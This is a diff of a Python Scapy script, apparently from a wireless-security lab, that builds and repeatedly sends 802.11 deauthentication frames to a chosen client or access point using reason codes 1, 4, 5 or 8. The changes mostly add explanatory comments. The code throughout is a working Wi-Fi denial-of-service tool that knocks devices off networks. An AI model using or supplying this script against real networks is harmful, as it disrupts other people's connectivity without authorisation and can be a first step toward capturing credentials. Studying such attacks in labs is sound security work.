@@ -19,8 +19,10 @@ parser.add_argument("-r", "--Reason", required=False,
 args = parser.parse_args()
 KO = True
 stop = False
-while KO:
+code = -1
 
+# While the user doesn't give a correct input, we ask for a correct reason code to send
+while KO:
     try:
         code = int(input("Entrer the reason code that you want to send. (1, 4, 5 or 8) (enter -1 to leave): "))
         if code == -1:
@@ -31,26 +33,32 @@ while KO:
 
 if stop:
     exit()
+
 addr1 = ''
 addr2 = ''
 addr3 = ''
 addr4 = ''
 
+# If the input is code 1, 4 or 5, we send a frame to the client STA
 if code == 1 or code == 4 or code == 5:
     addr1 = args.Client
     addr2 = args.BSSID
     addr3 = args.BSSID
+# If the input is code 8, we send a frame to the AP
 elif code == 8:
     addr1 = args.BSSID
     addr2 = args.Client
     addr3 = args.BSSID
+# Else, the input code is not valid
 else:
     print("Unknown reason code. Need to be 1, 4, 5 or 8")
     exit(0)
 
+# We build the frame using the corresponding address related to the given code
 packet = RadioTap() / Dot11(type=0, subtype=12, addr1=addr1, addr2=addr2, addr3=addr3, addr4=addr4) / Dot11Deauth(
     reason=code)
 
+# We send the number of frames requested in argument
 for n in range(int(args.Number)):
     sendp(packet, iface=args.Interface)
     print("#{}: Deauth sent via: {} ".format(n, args.Interface))
